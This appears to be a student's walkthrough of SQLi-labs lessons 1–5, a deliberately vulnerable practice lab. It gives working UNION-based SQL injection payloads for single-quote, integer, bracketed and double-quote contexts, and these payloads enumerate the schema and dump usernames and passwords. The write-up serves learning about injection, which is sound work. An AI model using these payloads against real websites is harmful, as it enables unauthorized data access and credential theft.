PLEASE DOWNLOAD THE FILE 
the questions which i have solved were les-1,2,3,4,5(partially) and i would explain the each and every step
les1:
	so when we give some random input as id=1 we can see the output out there so our main aim is to 
		1.break the query
		2.get the database
		3.get the relation
		4.dump the thing out 
	so when we type something fancy characters like 1' or 1/ we will be getting like 
		***''1'' LIMIT 0,1' so after balancing the quotes it looks like 
			'1'' limit 0,1 ==>1' limit 0,1 
				limit a,b is like a is the starting point and b is the number of records***
	this question is about:***"Breaking single quoted query"***
		so later on we need to find the attributes in the relation of the database so we will using an function order-by initially to just find the number of attributes nad later on we goes to the keyword union select which will combine the  attributes we inputted and gives us the output according to that 
		so by using database() we get the database used 
		so the payloads are:
		1.?id=-1 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='security'-- -         ***here we will be getting the relations under the db 'security' which consists the details of the master-database 'information_schema' and the relation 'table'***
		2.?id=-1' union select 1,group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where TABLE_NAME = 'users' and table_schema='security'-- - ***this is for the getting the details of the relation users***
		3.?id=-1' union select 1,group_concat(username),group_concat(password)from security.users-- - ***for the final dumping***
	refered wiki.bi0s and 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	
les2-
		this is about:***just a simple integer***
		payloads used:
			?id=-1 union select 1,2,3-- -      ***since it's an integer and we can find error when we put ?id=-1'***
				?id=-1 union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='security'-- -         ***here we will be getting the relations under the db 'security' which consists the details of the master-database 'information_schema' and the relation 'table'
				the details like username and password were present in the relation named 'users' so we need to access it and later on we need to get the names of the colums present in the relation 'users'***
				?id=-1 union select 1,group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where TABLE_NAME = 'users' and table_schema='security'-- -  ***-->this retrives the attributes of the table users***
as we know the table we can simply get the details of username and password		
				?id=-1 union select 1,group_concat(username),group_concat(password)from security.users-- -  ----->***retreiving the username and password***
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
les3:
question is about: "single quote with brackets"
	payloads for dumping:
		when we do 1' we get the error ''1'') LIMIT 0,1' we can see that the double quotes aren't double quotes but they are 2 single quotes and we also have a brace at the end this look like "breaking single quote with bracket           String1 = ‘) OR 1 -- -
"
this can be written as '1 ' ') limit 0,1 which is similar to 1') limit 0,1
so let's proceed with this 1') limit 0,1
***id=-1')-- -***
***?id=-1') union select 1,2,database()-- -*** ==>this retrives the database where the details were stored
and now we need to retrive the table and the number of attributes and then dump
***?id=-1') union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='security'-- -***
--now we got the tables and 'users' is our goal and we can retrive the number of attributes of the given relation
***?id=-1') union select 1,group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where TABLE_NAME = 'users' and table_schema='security'-- -***
so we got the attributes and we need to get the username,password
***?id=-1') union select 1,group_concat(username),group_concat(password) from security.users-- -***
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
les-4:
question is about :double quotes with brackets
	payloads:
		when we do 1' we get the error ""1"") LIMIT 0,1" "breaking double quote with bracket           String1 = ") OR 1 -- -
"
this can be written as "1"") limit 0,1 which is similar to 1") limit 0,1
so let's proceed with this 1") limit 0,1
id=-1")-- -
?id=-1") union select 1,2,database()-- - ==>this retrives the database where the details were stored
and now we need to retrive the table and the number of attributes and then dump
?id=-1") union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='security'-- -
--now we got the tables and 'users' is our goal and we can retrive the number of attributes of the given relation
?id=-1") union select 1,group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where TABLE_NAME = 'users' and table_schema='security'-- -
so we got the attributes and we need to get the username,password
?id=-1") union select 1,group_concat(username),group_concat(password) from security.users-- -
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
i can succesfully install and execute the sqli-labs
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
les5:
	it's all about the double query injection
		in this we can't find any proper error which makes us to dump so we use some functions to dump the data
